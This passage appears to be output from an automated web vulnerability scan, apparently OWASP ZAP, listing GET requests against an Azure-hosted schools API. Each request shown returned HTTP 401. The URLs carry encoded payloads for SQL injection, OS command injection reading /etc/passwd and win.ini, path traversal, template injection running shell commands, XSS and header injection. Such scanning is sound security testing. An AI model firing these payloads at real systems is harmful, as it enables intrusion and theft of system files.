  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%252FWEB-INF%252Fweb.xml&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253B&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253B+select+%2522java.lang.Thread.sleep%2522%252815000%2529+from+INFORMATION_SCHEMA.SYSTEM_COLUMNS+where+TABLE_NAME+%253D+%2527SYSTEM_COLUMNS%2527+and+COLUMN_NAME+%253D+%2527TABLE_NAME%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253Bprint%2528chr%2528122%2529.chr%252897%2529.chr%2528112%2529.chr%252895%2529.chr%2528116%2529.chr%2528111%2529.chr%2528107%2529.chr%2528101%2529.chr%2528110%2529%2529%253B&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253C%2521--%2523EXEC+cmd%253D%2522dir+%255C%2522--%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253C%2521--%2523EXEC+cmd%253D%2522ls+%252F%2522--%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253C%2521--&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253C%2523assign+ex%253D%2522freemarker.template.utility.Execute%2522%253Fnew%2528%2529%253E+%2524%257B+ex%2528%2522sleep+15%2522%2529+%257D&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253C%2525%253D%2525x%2528sleep+15%2529%2525%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253C%2525%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%2525%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253C&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253Cimg%2520src=%2522random.gif%2522%2520onerror=alert(1&29%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253Cscript%253Ealert(1&29%253C/script%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253Cxsl%253Avalue-of+select%253D%2522document%2528%2527http%253A%252F%252Fs198d01-ebis-establishment-fa.azurewebsites.net%253A22%2527%2529%2522%252F%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253Cxsl%253Avalue-of+select%253D%2522php%253Afunction%2528%2527exec%2527%252C%2527erroneous_command+2%253E%2526amp%253B1%2527%2529%2522%252F%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E%253C%2521--&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253Cxsl%253Avalue-of+select%253D%2522system-property%2528%2527xsl%253Avendor%2527%2529%2522%252F%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%253Cxsl%253Avariable+name%253D%2522rtobject%2522+select%253D%2522runtime%253AgetRuntime%2528%2529%2522%252F%253E%250A%253Cxsl%253Avariable+name%253D%2522process%2522+select%253D%2522runtime%253Aexec%2528%2524rtobject%252C%2527erroneous_command%2527%2529%2522%252F%253E%250A%253Cxsl%253Avariable+name%253D%2522waiting%2522+select%253D%2522process%253AwaitFor%2528%2524process%2529%2522%252F%253E%250A%253Cxsl%253Avalue-of+select%253D%2522%2524process%2522%252F%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%255Cschools&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%255CWEB-INF%255Cweb.xml&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%255D%255D%253E&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%257B%257B%2522%2522.__class__.__mro__%255B1%255D.__subclasses__%2528%2529%255B157%255D.__repr__.__globals__.get%2528%2522__builtins__%2522%2529.get%2528%2522__import__%2522%2529%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%2529%257D%257D&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%257B%257B%253D+global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529+%257D%257D&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%257B%257B__import__%2528%2522subprocess%2522%2529.check_output%2528%2522sleep+15%2522%252C+shell%253DTrue%2529%257D%257D&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%257B%257Brange.constructor%2528%2522return+eval%2528%255C%2522global.process.mainModule.require%2528%2527child_process%2527%2529.execSync%2528%2527sleep+15%2527%2529.toString%2528%2529%255C%2522%2529%2522%2529%2528%2529%257D%257D&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=%257Bsystem%2528%2522sleep+15%2522%2529%257D&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252FWindows%252Fsystem.ini&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255C..%255CWindows%255Csystem.ini&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=0W45pz4p&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=3i07o7d0g3lmddpagszdcvmzwl55k20lltsah5dgjvanqahw70vsofag8cl&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=5%253BURL%253D%2527https%253A%252F%252F980414377652208366.owasp.org%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=980414377652208366.owasp.org&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=any%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=any%250D%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6%250D%250A&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=any%250D%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=any%253F%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=any%253F%250D%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6%250D%250A&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=any%253F%250D%250ASet-cookie%253A+Tamper%253D08e6eae0-ec62-49e3-95ac-97e753f36ba6&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=c%253A%252F&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=c%253A%252FWindows%252Fsystem.ini&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=c%253A%255C&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=c%253A%255CWindows%255Csystem.ini&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=case+randomblob%2528100000%2529+when+not+null+then+1+else+1+end+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=case+randomblob%25281000000%2529+when+not+null+then+1+else+1+end+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=case+randomblob%252810000000%2529+when+not+null+then+1+else+1+end+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=case+randomblob%2528100000000%2529+when+not+null+then+1+else+1+end+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=case+randomblob%25281000000000%2529+when+not+null+then+1+else+1+end+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=case+when+cast%2528pg_sleep%252815.0%2529+as+varchar%2529+%253E+%2527%2527+then+0+else+1+end+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=cat+%252Fetc%252Fpasswd&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522%2526cat+%252Fetc%252Fpasswd%2526%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522%2526sleep+15.0%2526%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522%2526timeout+%252FT+15.0%2526%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522%253Bcat+%252Fetc%252Fpasswd%253B%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522%253Bget-help&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522%253Bsleep+15.0%253B%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522%253Bstart-sleep+-s+15.0&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522%257Ctimeout+%252FT+15.0&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522+%252F+sleep%252815%2529+%252F+%2522&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522+and+0+in+%2528select+sleep%252815%2529+%2529+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522+UNION+ALL+select+NULL+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522+WAITFOR+DELAY+%25270%253A0%253A15%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2522+where+0+in+%2528select+sleep%252815%2529+%2529+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2526cat+%252Fetc%252Fpasswd%2526&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2526sleep+15.0%2526&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2526timeout+%252FT+15.0&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2526type+%2525SYSTEMROOT%2525%255Cwin.ini&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527%2526cat+%252Fetc%252Fpasswd%2526%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527%2526sleep+15.0%2526%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527%2526timeout+%252FT+15.0%2526%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527%2526type+%2525SYSTEMROOT%2525%255Cwin.ini%2526%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527%2528&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527%2529+UNION+ALL+select+NULL+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527%253Bcat+%252Fetc%252Fpasswd%253B%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527%253Bget-help&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527%253Bsleep+15.0%253B%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527%253Bstart-sleep+-s+15.0&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527%257Ctimeout+%252FT+15.0&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527%257Ctype+%2525SYSTEMROOT%2525%255Cwin.ini&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527+%252F+%2522java.lang.Thread.sleep%2522%252815000%2529+%252F+%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527+%252F+%2528SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.1%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.2%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.3%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.4%2527%2529+from+dual+union+SELECT++UTL_INADDR.get_host_name%2528%252710.0.0.5%2527%2529+from+dual%2529+%252F+%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527+%252F+sleep%252815%2529+%252F+%2527&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
* URL: https://s198d01-ebis-establishment-fa.azurewebsites.net/api/schools%3FcompanyNumber=companyNumber%2527+AND+%25271%2527%253D%25271%2527+--+&laCode=10&phase=phase
  * Method: `GET`
  * Parameter: ``
  * Attack: ``
  * Evidence: `HTTP/1.1 401`
  * Other Info: ``
